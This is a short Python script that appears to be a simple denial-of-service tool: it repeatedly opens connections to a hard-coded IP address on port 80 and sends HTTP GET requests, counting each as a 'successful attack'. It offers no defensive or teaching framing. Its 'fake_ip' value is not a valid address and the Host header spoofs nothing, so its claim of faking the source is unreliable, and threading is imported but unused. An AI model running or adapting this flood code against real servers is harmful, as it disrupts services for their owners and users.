import socket
import threading

target = "217.15.165.191"
fake_ip = "277.15.165.199"
port = 80

attack_num = 0


def attack():
    global attack_num
    while True:
        try:
            # Create a new socket object
            soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            soc.connect((target, port))

            # Send HTTP GET request with fake headers
            request = f"GET / HTTP/1.1\r\nHost: {fake_ip}\r\n\r\n"
            soc.send(request.encode("ascii"))

            # Increment the attack counter
            attack_num += 1
            print(f'Successful Attack on {target}: {attack_num}')

            # Close the socket connection
            soc.close()
        except Exception as e:
            print(f"Error occurred: {e}")
            continue
